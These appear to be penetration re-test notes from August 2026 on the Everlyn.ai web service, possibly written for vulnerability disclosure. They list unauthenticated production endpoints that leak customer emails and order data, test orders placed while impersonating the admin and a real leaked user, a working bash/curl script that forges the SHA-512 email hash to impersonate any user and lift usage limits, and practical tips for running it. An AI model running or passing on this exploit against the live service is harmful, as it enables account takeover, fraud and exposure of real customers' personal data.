# Everlyn.ai — 2026-08 Live Re-Test Results

## Attack Chain

Issue 1 (admin orders leak emails) → Issue 2 (SHA-512 = not a secret) → impersonate anyone

## Key Endpoints

- `GET https://www.everlyn.ai/api/admin/orders` — 50+ customer orders, no auth, 35+ emails
- `POST https://vapi.everlyn.ai/order` — SHA-512(email) = auth, computable by anyone
- `GET https://vapi.everlyn.ai/check_ai/<order_id>` — no auth, MongoDB ObjectId predictable
- `GET https://vapi.everlyn.ai/api/history/<user_id>` — no auth
- `GET https://vapi.everlyn.ai/openapi.json` — 37 endpoints public

## Live Test Orders (13 Aug 2026)

- `6a7d6e56e96345e804e5c096` — ghost account (never registered)
- `6a7d74a1fe50bd3e9fc00456` — admin impersonation (admin@everlyn.ai)
- `6a7d74a5fe50bd3e9fc00458` — victim impersonation (<REDACTED-EMAIL> from leak)

## Impersonation Pattern

```bash
EMAIL="victim@example.com"
HASH=$(python3 -c "import hashlib; print(hashlib.sha512(b'$EMAIL').hexdigest())")
curl -s -X POST https://vapi.everlyn.ai/order \
  -H 'Content-Type: application/json' \
  -d "{\"user_id\":\"$EMAIL\",\"user_hash\":\"$HASH\",\"user_limit\":999,
       \"credits_to_lock\":0,\"need_watermark\":false,...}"
```

## Pitfalls

- `/api/admin/orders` now returns HTML (Next.js RSC), not JSON — data is embedded in RSC payload
- Windows PowerShell users: `head` doesn't exist, `curl` is aliased to `Invoke-WebRequest`. Use `curl.exe` and `Select-String` instead.
- GPU orders may never render for unregistered users, but order acceptance itself proves the bypass
- SHA-512 is computed client-side in the frontend JavaScript — not a server-side secret